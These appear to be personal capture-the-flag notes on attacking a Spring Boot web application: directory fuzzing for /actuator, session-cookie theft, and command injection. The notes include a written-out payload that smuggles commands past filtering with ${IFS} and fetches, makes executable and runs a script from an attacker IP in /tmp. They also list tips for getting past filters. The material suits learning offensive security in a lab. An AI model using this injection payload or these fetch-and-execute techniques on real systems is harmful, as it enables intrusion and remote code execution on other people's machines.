New technique learned!
- After gobuster enumeration, found an /error endpoint with status 500
- DON"T IGNORE! Check it out -> "Whitelabel error"
	- Google: identify that it is a Spring boot application (Java)
	- Then use a **springboot wordlist** to find /actuator
	- Todo: **UDPATE SECLISTS????**

{"38E585E61C2C933C0C1CAD5539324D49":"UNAUTHORIZED","4AE1E7881A78F429AC362289A2358C57":"kanderson"}

```

host=127.0.0.1&username=localhost;wget${IFS}10.10.15.140:1234/script2.sh${IFS}-o${IFS}/tmp/script2.sh;chmod${IFS}777${IFS}/tmp/script2.sh;/tmp/script2.sh;
```

DOESNT WORK!
not sure why.

Learning points
- Identify Java Spring Boot, then fuzz for that type specifically
- Cookie stealing (got this right)
- Command injection
	- Don't give up so easily! **Try different fields**. And try to look out for the filtered characters and bypass accordingly
	- Java is finicky with certain outputs, so instead of sending shell directly, write it to a file on attacker machine, then download the file on to the victim machine and run it
	- If cannot write to /, write to /tmp and execute
	- **use curl instead of wget**
	- Run the file with `bash /tmp/script.sh`
- Nginx, but is a java app.
	- Where to find java app config?
	- ps aux | grep java
	- find / -name "cloudhosting-0.0.1.jar" 2>/dev/null
